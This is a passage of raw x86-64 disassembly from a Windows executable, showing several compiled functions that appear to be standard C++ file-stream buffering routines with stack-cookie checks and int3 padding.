   1400052d9:	0f 85 90 00 00 00    	jne    0x14000536f
   1400052df:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   1400052e4:	48 8b cb             	mov    %rbx,%rcx
   1400052e7:	48 8b bb 80 00 00 00 	mov    0x80(%rbx),%rdi
   1400052ee:	c6 43 7c 01          	movb   $0x1,0x7c(%rbx)
   1400052f2:	40 88 73 71          	mov    %sil,0x71(%rbx)
   1400052f6:	ff 15 5c 3f 00 00    	call   *0x3f5c(%rip)        # 0x140009258
   1400052fc:	48 85 ff             	test   %rdi,%rdi
   1400052ff:	74 4e                	je     0x14000534f
   140005301:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140005306:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000530b:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   140005310:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140005315:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000531a:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000531f:	48 8b cf             	mov    %rdi,%rcx
   140005322:	ff 15 38 42 00 00    	call   *0x4238(%rip)        # 0x140009560
   140005328:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000532d:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   140005331:	48 89 4b 20          	mov    %rcx,0x20(%rbx)
   140005335:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000533a:	48 89 4b 38          	mov    %rcx,0x38(%rbx)
   14000533e:	48 89 4b 40          	mov    %rcx,0x40(%rbx)
   140005342:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140005347:	48 89 4b 50          	mov    %rcx,0x50(%rbx)
   14000534b:	48 89 4b 58          	mov    %rcx,0x58(%rbx)
   14000534f:	48 8b 0d 2a 96 00 00 	mov    0x962a(%rip),%rcx        # 0x14000e980
   140005356:	48 8b c3             	mov    %rbx,%rax
   140005359:	48 89 bb 80 00 00 00 	mov    %rdi,0x80(%rbx)
   140005360:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140005365:	48 89 4b 74          	mov    %rcx,0x74(%rbx)
   140005369:	48 89 73 68          	mov    %rsi,0x68(%rbx)
   14000536d:	eb 02                	jmp    0x140005371
   14000536f:	33 c0                	xor    %eax,%eax
   140005371:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140005376:	48 33 cc             	xor    %rsp,%rcx
   140005379:	e8 42 1b 00 00       	call   0x140006ec0
   14000537e:	48 83 c4 48          	add    $0x48,%rsp
   140005382:	5e                   	pop    %rsi
   140005383:	5b                   	pop    %rbx
   140005384:	c3                   	ret
   140005385:	cc                   	int3
   140005386:	cc                   	int3
   140005387:	cc                   	int3
   140005388:	cc                   	int3
   140005389:	cc                   	int3
   14000538a:	cc                   	int3
   14000538b:	cc                   	int3
   14000538c:	cc                   	int3
   14000538d:	cc                   	int3
   14000538e:	cc                   	int3
   14000538f:	cc                   	int3
   140005390:	40 53                	rex push %rbx
   140005392:	56                   	push   %rsi
   140005393:	57                   	push   %rdi
   140005394:	48 83 ec 30          	sub    $0x30,%rsp
   140005398:	48 8b 05 a1 8c 00 00 	mov    0x8ca1(%rip),%rax        # 0x14000e040
   14000539f:	48 33 c4             	xor    %rsp,%rax
   1400053a2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400053a7:	49 8b 40 08          	mov    0x8(%r8),%rax
   1400053ab:	49 8b f0             	mov    %r8,%rsi
   1400053ae:	49 03 00             	add    (%r8),%rax
   1400053b1:	48 8b da             	mov    %rdx,%rbx
   1400053b4:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400053bb:	00 
   1400053bc:	48 8b f9             	mov    %rcx,%rdi
   1400053bf:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400053c4:	74 70                	je     0x140005436
   1400053c6:	e8 e5 0f 00 00       	call   0x1400063b0
   1400053cb:	84 c0                	test   %al,%al
   1400053cd:	74 67                	je     0x140005436
   1400053cf:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   1400053d6:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400053db:	ff 15 ef 41 00 00    	call   *0x41ef(%rip)        # 0x1400095d0
   1400053e1:	85 c0                	test   %eax,%eax
   1400053e3:	75 51                	jne    0x140005436
   1400053e5:	48 8b 46 10          	mov    0x10(%rsi),%rax
   1400053e9:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   1400053ed:	48 89 47 74          	mov    %rax,0x74(%rdi)
   1400053f1:	48 8d 47 70          	lea    0x70(%rdi),%rax
   1400053f5:	48 39 01             	cmp    %rax,(%rcx)
   1400053f8:	75 22                	jne    0x14000541c
   1400053fa:	48 8b 97 88 00 00 00 	mov    0x88(%rdi),%rdx
   140005401:	4c 8b 87 90 00 00 00 	mov    0x90(%rdi),%r8
   140005408:	48 89 11             	mov    %rdx,(%rcx)
   14000540b:	44 2b c2             	sub    %edx,%r8d
   14000540e:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140005412:	48 89 11             	mov    %rdx,(%rcx)
   140005415:	48 8b 4f 50          	mov    0x50(%rdi),%rcx
   140005419:	44 89 01             	mov    %r8d,(%rcx)
   14000541c:	48 8b 57 74          	mov    0x74(%rdi),%rdx
   140005420:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140005425:	48 89 0b             	mov    %rcx,(%rbx)
   140005428:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   14000542c:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140005433:	00 
   140005434:	eb 15                	jmp    0x14000544b
   140005436:	33 c0                	xor    %eax,%eax
   140005438:	48 c7 03 ff ff ff ff 	movq   $0xffffffffffffffff,(%rbx)
   14000543f:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   140005446:	00 
   140005447:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000544b:	48 8b c3             	mov    %rbx,%rax
   14000544e:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140005453:	48 33 cc             	xor    %rsp,%rcx
   140005456:	e8 65 1a 00 00       	call   0x140006ec0
   14000545b:	48 83 c4 30          	add    $0x30,%rsp
   14000545f:	5f                   	pop    %rdi
   140005460:	5e                   	pop    %rsi
   140005461:	5b                   	pop    %rbx
   140005462:	c3                   	ret
   140005463:	cc                   	int3
   140005464:	cc                   	int3
   140005465:	cc                   	int3
   140005466:	cc                   	int3
   140005467:	cc                   	int3
   140005468:	cc                   	int3
   140005469:	cc                   	int3
   14000546a:	cc                   	int3
   14000546b:	cc                   	int3
   14000546c:	cc                   	int3
   14000546d:	cc                   	int3
   14000546e:	cc                   	int3
   14000546f:	cc                   	int3
   140005470:	40 53                	rex push %rbx
   140005472:	55                   	push   %rbp
   140005473:	56                   	push   %rsi
   140005474:	57                   	push   %rdi
   140005475:	41 56                	push   %r14
   140005477:	48 83 ec 30          	sub    $0x30,%rsp
   14000547b:	48 8b 05 be 8b 00 00 	mov    0x8bbe(%rip),%rax        # 0x14000e040
   140005482:	48 33 c4             	xor    %rsp,%rax
   140005485:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000548a:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000548e:	4c 8d 71 70          	lea    0x70(%rcx),%r14
   140005492:	41 8b e9             	mov    %r9d,%ebp
   140005495:	49 8b f0             	mov    %r8,%rsi
   140005498:	48 8b fa             	mov    %rdx,%rdi
   14000549b:	48 8b d9             	mov    %rcx,%rbx
   14000549e:	4c 39 30             	cmp    %r14,(%rax)
   1400054a1:	75 10                	jne    0x1400054b3
   1400054a3:	41 83 f9 01          	cmp    $0x1,%r9d
   1400054a7:	75 0a                	jne    0x1400054b3
   1400054a9:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   1400054ae:	75 03                	jne    0x1400054b3
   1400054b0:	48 ff ce             	dec    %rsi
   1400054b3:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400054ba:	00 
   1400054bb:	0f 84 85 00 00 00    	je     0x140005546
   1400054c1:	e8 ea 0e 00 00       	call   0x1400063b0
   1400054c6:	84 c0                	test   %al,%al
   1400054c8:	74 7c                	je     0x140005546
   1400054ca:	48 85 f6             	test   %rsi,%rsi
   1400054cd:	75 05                	jne    0x1400054d4
   1400054cf:	83 fd 01             	cmp    $0x1,%ebp
   1400054d2:	74 17                	je     0x1400054eb
   1400054d4:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   1400054db:	44 8b c5             	mov    %ebp,%r8d
   1400054de:	48 8b d6             	mov    %rsi,%rdx
   1400054e1:	ff 15 a9 40 00 00    	call   *0x40a9(%rip)        # 0x140009590
   1400054e7:	85 c0                	test   %eax,%eax
   1400054e9:	75 5b                	jne    0x140005546
   1400054eb:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   1400054f2:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400054f7:	ff 15 7b 40 00 00    	call   *0x407b(%rip)        # 0x140009578
   1400054fd:	85 c0                	test   %eax,%eax
   1400054ff:	75 45                	jne    0x140005546
   140005501:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140005505:	4c 39 30             	cmp    %r14,(%rax)
   140005508:	75 22                	jne    0x14000552c
   14000550a:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140005511:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   140005518:	48 89 10             	mov    %rdx,(%rax)
   14000551b:	44 2b c2             	sub    %edx,%r8d
   14000551e:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140005522:	48 89 11             	mov    %rdx,(%rcx)
   140005525:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   140005529:	44 89 01             	mov    %r8d,(%rcx)
   14000552c:	48 8b 53 74          	mov    0x74(%rbx),%rdx
   140005530:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140005535:	48 89 0f             	mov    %rcx,(%rdi)
   140005538:	48 89 57 10          	mov    %rdx,0x10(%rdi)
   14000553c:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   140005543:	00 
   140005544:	eb 15                	jmp    0x14000555b
   140005546:	33 c0                	xor    %eax,%eax
   140005548:	48 c7 07 ff ff ff ff 	movq   $0xffffffffffffffff,(%rdi)
   14000554f:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   140005556:	00 
   140005557:	48 89 47 10          	mov    %rax,0x10(%rdi)
   14000555b:	48 8b c7             	mov    %rdi,%rax
   14000555e:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140005563:	48 33 cc             	xor    %rsp,%rcx
   140005566:	e8 55 19 00 00       	call   0x140006ec0
   14000556b:	48 83 c4 30          	add    $0x30,%rsp
   14000556f:	41 5e                	pop    %r14
   140005571:	5f                   	pop    %rdi
   140005572:	5e                   	pop    %rsi
   140005573:	5d                   	pop    %rbp
   140005574:	5b                   	pop    %rbx
   140005575:	c3                   	ret
   140005576:	cc                   	int3
   140005577:	cc                   	int3
   140005578:	cc                   	int3
   140005579:	cc                   	int3
   14000557a:	cc                   	int3
   14000557b:	cc                   	int3
   14000557c:	cc                   	int3
   14000557d:	cc                   	int3
   14000557e:	cc                   	int3
   14000557f:	cc                   	int3
   140005580:	40 53                	rex push %rbx
   140005582:	55                   	push   %rbp
   140005583:	57                   	push   %rdi
   140005584:	48 83 ec 20          	sub    $0x20,%rsp
   140005588:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   14000558d:	49 8b d8             	mov    %r8,%rbx
   140005590:	48 8b ea             	mov    %rdx,%rbp
   140005593:	48 8b f9             	mov    %rcx,%rdi
   140005596:	74 0e                	je     0x1400055a6
   140005598:	48 83 c4 20          	add    $0x20,%rsp
   14000559c:	5f                   	pop    %rdi
   14000559d:	5d                   	pop    %rbp
   14000559e:	5b                   	pop    %rbx
   14000559f:	48 ff 25 f2 3b 00 00 	rex.W jmp *0x3bf2(%rip)        # 0x140009198
   1400055a6:	48 8b 41 40          	mov    0x40(%rcx),%rax
   1400055aa:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   1400055af:	48 8b f3             	mov    %rbx,%rsi
   1400055b2:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   1400055b7:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   1400055bc:	4c 8b 08             	mov    (%rax),%r9
   1400055bf:	4d 85 c9             	test   %r9,%r9
   1400055c2:	74 08                	je     0x1400055cc
   1400055c4:	48 8b 41 58          	mov    0x58(%rcx),%rax
   1400055c8:	8b 08                	mov    (%rax),%ecx
   1400055ca:	eb 02                	jmp    0x1400055ce
   1400055cc:	33 c9                	xor    %ecx,%ecx
   1400055ce:	4c 63 f9             	movslq %ecx,%r15
   1400055d1:	48 85 db             	test   %rbx,%rbx
   1400055d4:	7e 52                	jle    0x140005628
   1400055d6:	85 c9                	test   %ecx,%ecx
   1400055d8:	7e 2e                	jle    0x140005608
   1400055da:	49 3b df             	cmp    %r15,%rbx
   1400055dd:	49 8b c9             	mov    %r9,%rcx
   1400055e0:	4c 0f 4c fb          	cmovl  %rbx,%r15
   1400055e4:	4d 8b c7             	mov    %r15,%r8
   1400055e7:	e8 5f 29 00 00       	call   0x140007f4b
   1400055ec:	48 8b 47 58          	mov    0x58(%rdi),%rax
   1400055f0:	49 2b df             	sub    %r15,%rbx
   1400055f3:	49 03 ef             	add    %r15,%rbp
   1400055f6:	44 29 38             	sub    %r15d,(%rax)
   1400055f9:	48 8b 4f 40          	mov    0x40(%rdi),%rcx
   1400055fd:	49 63 c7             	movslq %r15d,%rax
   140005600:	48 01 01             	add    %rax,(%rcx)
   140005603:	48 85 db             	test   %rbx,%rbx
   140005606:	7e 20                	jle    0x140005628
   140005608:	4c 8b 8f 80 00 00 00 	mov    0x80(%rdi),%r9
   14000560f:	4d 85 c9             	test   %r9,%r9
   140005612:	74 14                	je     0x140005628
   140005614:	4c 8b c3             	mov    %rbx,%r8
   140005617:	ba 01 00 00 00       	mov    $0x1,%edx
   14000561c:	48 8b cd             	mov    %rbp,%rcx
   14000561f:	ff 15 5b 3f 00 00    	call   *0x3f5b(%rip)        # 0x140009580
   140005625:	48 2b d8             	sub    %rax,%rbx
   140005628:	4c 8b 7c 24 58       	mov    0x58(%rsp),%r15
   14000562d:	48 2b f3             	sub    %rbx,%rsi
   140005630:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   140005635:	48 8b c6             	mov    %rsi,%rax
   140005638:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000563d:	48 83 c4 20          	add    $0x20,%rsp
   140005641:	5f                   	pop    %rdi
   140005642:	5d                   	pop    %rbp
   140005643:	5b                   	pop    %rbx
   140005644:	c3                   	ret
   140005645:	cc                   	int3
   140005646:	cc                   	int3
   140005647:	cc                   	int3
   140005648:	cc                   	int3
   140005649:	cc                   	int3
   14000564a:	cc                   	int3
   14000564b:	cc                   	int3
   14000564c:	cc                   	int3
   14000564d:	cc                   	int3
   14000564e:	cc                   	int3
   14000564f:	cc                   	int3
   140005650:	40 55                	rex push %rbp
   140005652:	56                   	push   %rsi
   140005653:	41 56                	push   %r14
   140005655:	48 83 ec 30          	sub    $0x30,%rsp
   140005659:	4d 8b f0             	mov    %r8,%r14
   14000565c:	48 8b ea             	mov    %rdx,%rbp
   14000565f:	48 8b f1             	mov    %rcx,%rsi
   140005662:	4d 85 c0             	test   %r8,%r8
   140005665:	7f 0b                	jg     0x140005672
   140005667:	33 c0                	xor    %eax,%eax
   140005669:	48 83 c4 30          	add    $0x30,%rsp
   14000566d:	41 5e                	pop    %r14
   14000566f:	5e                   	pop    %rsi
   140005670:	5d                   	pop    %rbp
   140005671:	c3                   	ret
   140005672:	48 83 79 68 00       	cmpq   $0x0,0x68(%rcx)
   140005677:	74 0f                	je     0x140005688
   140005679:	48 83 c4 30          	add    $0x30,%rsp
   14000567d:	41 5e                	pop    %r14
   14000567f:	5e                   	pop    %rsi
   140005680:	5d                   	pop    %rbp
   140005681:	48 ff 25 18 3b 00 00 	rex.W jmp *0x3b18(%rip)        # 0x1400091a0
   140005688:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000568c:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140005691:	49 8b de             	mov    %r14,%rbx
   140005694:	48 8b 10             	mov    (%rax),%rdx
   140005697:	48 85 d2             	test   %rdx,%rdx
   14000569a:	74 08                	je     0x1400056a4
   14000569c:	48 8b 41 50          	mov    0x50(%rcx),%rax
   1400056a0:	8b 08                	mov    (%rax),%ecx
   1400056a2:	eb 02                	jmp    0x1400056a6
   1400056a4:	33 c9                	xor    %ecx,%ecx
   1400056a6:	48 63 c1             	movslq %ecx,%rax
   1400056a9:	85 c9                	test   %ecx,%ecx
   1400056ab:	74 35                	je     0x1400056e2
   1400056ad:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400056b2:	49 3b c6             	cmp    %r14,%rax
   1400056b5:	49 8b fe             	mov    %r14,%rdi
   1400056b8:	48 8b cd             	mov    %rbp,%rcx
   1400056bb:	48 0f 42 f8          	cmovb  %rax,%rdi
   1400056bf:	4c 8b c7             	mov    %rdi,%r8
   1400056c2:	e8 84 28 00 00       	call   0x140007f4b
   1400056c7:	48 8b 46 50          	mov    0x50(%rsi),%rax
   1400056cb:	48 03 ef             	add    %rdi,%rbp
   1400056ce:	48 2b df             	sub    %rdi,%rbx
   1400056d1:	29 38                	sub    %edi,(%rax)
   1400056d3:	48 8b 4e 38          	mov    0x38(%rsi),%rcx
   1400056d7:	48 63 c7             	movslq %edi,%rax
   1400056da:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1400056df:	48 01 01             	add    %rax,(%rcx)
   1400056e2:	48 83 be 80 00 00 00 	cmpq   $0x0,0x80(%rsi)
   1400056e9:	00 
   1400056ea:	0f 84 8e 00 00 00    	je     0x14000577e
   1400056f0:	4c 8b 46 18          	mov    0x18(%rsi),%r8
   1400056f4:	48 8d 46 70          	lea    0x70(%rsi),%rax
   1400056f8:	49 39 00             	cmp    %rax,(%r8)
   1400056fb:	75 20                	jne    0x14000571d
   1400056fd:	48 8b 8e 88 00 00 00 	mov    0x88(%rsi),%rcx
   140005704:	48 8b 96 90 00 00 00 	mov    0x90(%rsi),%rdx
   14000570b:	49 89 08             	mov    %rcx,(%r8)
   14000570e:	2b d1                	sub    %ecx,%edx
   140005710:	48 8b 46 38          	mov    0x38(%rsi),%rax
   140005714:	48 89 08             	mov    %rcx,(%rax)
   140005717:	48 8b 46 50          	mov    0x50(%rsi),%rax
   14000571b:	89 10                	mov    %edx,(%rax)
   14000571d:	48 81 fb ff 0f 00 00 	cmp    $0xfff,%rbx
   140005724:	76 38                	jbe    0x14000575e
   140005726:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000572d:	00 00 00 
   140005730:	4c 8b 8e 80 00 00 00 	mov    0x80(%rsi),%r9
   140005737:	ba 01 00 00 00       	mov    $0x1,%edx
   14000573c:	41 b8 ff 0f 00 00    	mov    $0xfff,%r8d
   140005742:	48 8b cd             	mov    %rbp,%rcx
   140005745:	ff 15 6d 3e 00 00    	call   *0x3e6d(%rip)        # 0x1400095b8
   14000574b:	48 03 e8             	add    %rax,%rbp
   14000574e:	48 2b d8             	sub    %rax,%rbx
   140005751:	48 3d ff 0f 00 00    	cmp    $0xfff,%rax
   140005757:	75 25                	jne    0x14000577e
   140005759:	48 3b d8             	cmp    %rax,%rbx
   14000575c:	77 d2                	ja     0x140005730
   14000575e:	48 85 db             	test   %rbx,%rbx
   140005761:	74 1b                	je     0x14000577e
   140005763:	4c 8b 8e 80 00 00 00 	mov    0x80(%rsi),%r9
   14000576a:	4c 8b c3             	mov    %rbx,%r8
   14000576d:	ba 01 00 00 00       	mov    $0x1,%edx
   140005772:	48 8b cd             	mov    %rbp,%rcx
   140005775:	ff 15 3d 3e 00 00    	call   *0x3e3d(%rip)        # 0x1400095b8
   14000577b:	48 2b d8             	sub    %rax,%rbx
   14000577e:	4c 2b f3             	sub    %rbx,%r14
   140005781:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140005786:	49 8b c6             	mov    %r14,%rax
   140005789:	48 83 c4 30          	add    $0x30,%rsp
   14000578d:	41 5e                	pop    %r14
   14000578f:	5e                   	pop    %rsi
   140005790:	5d                   	pop    %rbp
   140005791:	c3                   	ret
   140005792:	cc                   	int3
   140005793:	cc                   	int3
   140005794:	cc                   	int3
   140005795:	cc                   	int3
   140005796:	cc                   	int3
   140005797:	cc                   	int3
   140005798:	cc                   	int3
   140005799:	cc                   	int3
   14000579a:	cc                   	int3
   14000579b:	cc                   	int3
   14000579c:	cc                   	int3
   14000579d:	cc                   	int3
   14000579e:	cc                   	int3
   14000579f:	cc                   	int3
   1400057a0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400057a5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400057aa:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400057af:	55                   	push   %rbp
   1400057b0:	48 8b ec             	mov    %rsp,%rbp
   1400057b3:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1400057ba:	48 8b 05 7f 88 00 00 	mov    0x887f(%rip),%rax        # 0x14000e040
   1400057c1:	48 33 c4             	xor    %rsp,%rax
   1400057c4:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400057c8:	48 8b f9             	mov    %rcx,%rdi
   1400057cb:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400057cf:	48 8b 08             	mov    (%rax),%rcx
   1400057d2:	48 85 c9             	test   %rcx,%rcx
   1400057d5:	74 2c                	je     0x140005803
   1400057d7:	48 8b 57 50          	mov    0x50(%rdi),%rdx
   1400057db:	4c 63 0a             	movslq (%rdx),%r9
   1400057de:	4a 8d 04 09          	lea    (%rcx,%r9,1),%rax
   1400057e2:	48 3b c8             	cmp    %rax,%rcx
   1400057e5:	73 1c                	jae    0x140005803
   1400057e7:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   1400057eb:	89 02                	mov    %eax,(%rdx)
   1400057ed:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   1400057f1:	48 8b 11             	mov    (%rcx),%rdx
   1400057f4:	48 8d 42 01          	lea    0x1(%rdx),%rax
   1400057f8:	48 89 01             	mov    %rax,(%rcx)
   1400057fb:	0f b6 02             	movzbl (%rdx),%eax
   1400057fe:	e9 5c 02 00 00       	jmp    0x140005a5f
   140005803:	48 83 bf 80 00 00 00 	cmpq   $0x0,0x80(%rdi)
   14000580a:	00 
   14000580b:	75 0a                	jne    0x140005817
   14000580d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005812:	e9 48 02 00 00       	jmp    0x140005a5f
   140005817:	4c 8b 4f 18          	mov    0x18(%rdi),%r9
   14000581b:	48 8d 47 70          	lea    0x70(%rdi),%rax
   14000581f:	49 39 01             	cmp    %rax,(%r9)
   140005822:	75 20                	jne    0x140005844
   140005824:	48 8b 97 90 00 00 00 	mov    0x90(%rdi),%rdx
   14000582b:	48 8b 8f 88 00 00 00 	mov    0x88(%rdi),%rcx
   140005832:	49 89 09             	mov    %rcx,(%r9)
   140005835:	48 8b 47 38          	mov    0x38(%rdi),%rax
   140005839:	48 89 08             	mov    %rcx,(%rax)
   14000583c:	2b d1                	sub    %ecx,%edx
   14000583e:	48 8b 47 50          	mov    0x50(%rdi),%rax
   140005842:	89 10                	mov    %edx,(%rax)
   140005844:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   14000584b:	48 83 7f 68 00       	cmpq   $0x0,0x68(%rdi)
   140005850:	75 1c                	jne    0x14000586e
   140005852:	ff 15 48 3d 00 00    	call   *0x3d48(%rip)        # 0x1400095a0
   140005858:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000585b:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140005860:	0f 84 f7 01 00 00    	je     0x140005a5d
   140005866:	0f b6 d8             	movzbl %al,%ebx
   140005869:	e9 ef 01 00 00       	jmp    0x140005a5d
   14000586e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005871:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140005875:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
   14000587c:	00 
   14000587d:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   140005884:	00 
   140005885:	c6 45 d8 00          	movb   $0x0,-0x28(%rbp)
   140005889:	ff 15 11 3d 00 00    	call   *0x3d11(%rip)        # 0x1400095a0
   14000588f:	44 8b c8             	mov    %eax,%r9d
   140005892:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005895:	0f 84 01 01 00 00    	je     0x14000599c
   14000589b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400058a0:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   1400058a4:	4c 8b 45 f0          	mov    -0x10(%rbp),%r8
   1400058a8:	49 3b d0             	cmp    %r8,%rdx
   1400058ab:	73 20                	jae    0x1400058cd
   1400058ad:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
   1400058b1:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   1400058b5:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   1400058b9:	49 83 f8 0f          	cmp    $0xf,%r8
   1400058bd:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   1400058c2:	44 88 0c 10          	mov    %r9b,(%rax,%rdx,1)
   1400058c6:	c6 44 10 01 00       	movb   $0x0,0x1(%rax,%rdx,1)
   1400058cb:	eb 09                	jmp    0x1400058d6
   1400058cd:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   1400058d1:	e8 0a 0f 00 00       	call   0x1400067e0
   1400058d6:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   1400058da:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   1400058df:	48 0f 47 55 d8       	cmova  -0x28(%rbp),%rdx
   1400058e4:	4c 8d 45 d8          	lea    -0x28(%rbp),%r8
   1400058e8:	4c 0f 47 45 d8       	cmova  -0x28(%rbp),%r8
   1400058ed:	4c 8b 4d e8          	mov    -0x18(%rbp),%r9
   1400058f1:	4c 03 ca             	add    %rdx,%r9
   1400058f4:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
   1400058f8:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400058fd:	48 8d 45 d1          	lea    -0x2f(%rbp),%rax
   140005901:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005906:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   14000590a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000590f:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140005913:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005918:	48 8d 57 74          	lea    0x74(%rdi),%rdx
   14000591c:	48 8b 4f 68          	mov    0x68(%rdi),%rcx
   140005920:	ff 15 a2 38 00 00    	call   *0x38a2(%rip)        # 0x1400091c8
   140005926:	85 c0                	test   %eax,%eax
   140005928:	74 09                	je     0x140005933
   14000592a:	83 e8 01             	sub    $0x1,%eax
   14000592d:	0f 85 c2 00 00 00    	jne    0x1400059f5
   140005933:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140005937:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
   14000593b:	48 39 45 c8          	cmp    %rax,-0x38(%rbp)
   14000593f:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140005943:	0f 85 c4 00 00 00    	jne    0x140005a0d
   140005949:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   14000594e:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140005953:	4c 8b 4d c0          	mov    -0x40(%rbp),%r9
   140005957:	4c 2b c8             	sub    %rax,%r9
   14000595a:	49 3b d9             	cmp    %r9,%rbx
   14000595d:	4c 0f 42 cb          	cmovb  %rbx,%r9
   140005961:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140005965:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   14000596a:	48 0f 47 4d d8       	cmova  -0x28(%rbp),%rcx
   14000596f:	49 2b d9             	sub    %r9,%rbx
   140005972:	4c 8d 43 01          	lea    0x1(%rbx),%r8
   140005976:	49 8d 14 09          	lea    (%r9,%rcx,1),%rdx
   14000597a:	e8 d2 25 00 00       	call   0x140007f51
   14000597f:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   140005983:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   14000598a:	ff 15 10 3c 00 00    	call   *0x3c10(%rip)        # 0x1400095a0
   140005990:	44 8b c8             	mov    %eax,%r9d
   140005993:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005996:	0f 85 04 ff ff ff    	jne    0x1400058a0
   14000599c:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400059a1:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   1400059a5:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400059a9:	0f 86 ae 00 00 00    	jbe    0x140005a5d
   1400059af:	48 ff c2             	inc    %rdx
   1400059b2:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   1400059b6:	48 8b c1             	mov    %rcx,%rax
   1400059b9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400059c0:	0f 82 92 00 00 00    	jb     0x140005a58
   1400059c6:	48 83 c2 27          	add    $0x27,%rdx
